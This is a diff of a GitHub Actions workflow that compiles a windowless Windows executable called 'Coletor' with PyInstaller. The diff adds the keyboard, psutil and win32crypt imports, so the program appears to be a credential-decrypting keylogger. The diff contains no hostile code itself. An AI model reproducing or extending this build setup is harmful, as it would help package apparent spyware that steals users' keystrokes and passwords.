@@ -1,4 +1,4 @@
-name: Compilar Windows
+name: Build Windows EXE
 
 on:
   push:
@@ -9,24 +9,22 @@ jobs:
     runs-on: windows-latest
     steps:
     - uses: actions/checkout@v4
+
     - name: Setup Python
       uses: actions/setup-python@v5
       with:
         python-version: '3.10'
-    - name: Instalar dependências
+
+    - name: Install dependencies
       run: |
         pip install --upgrade pip
-        pip install pycryptodome pywin32 pyinstaller
-    - name: Compilar
+        pip install pycryptodome pywin32 psutil keyboard pyinstaller
+
+    - name: Compile EXE
       run: |
-        pyinstaller --onefile --noconsole `
-          --hidden-import win32crypt `
-          --hidden-import win32com `
-          --hidden-import pywintypes `
-          --collect-all win32crypt `
-          --collect-all pywin32 `
-          --name Coletor coletor.py
-    - name: Upload do .exe
+        pyinstaller --onefile --noconsole --hidden-import win32crypt --hidden-import win32com --hidden-import pywintypes --collect-all win32crypt --collect-all pywin32 --hidden-import keyboard --collect-all keyboard --name Coletor coletor.py
+
+    - name: Upload artifact
       uses: actions/upload-artifact@v4
       with:
         name: Coletor
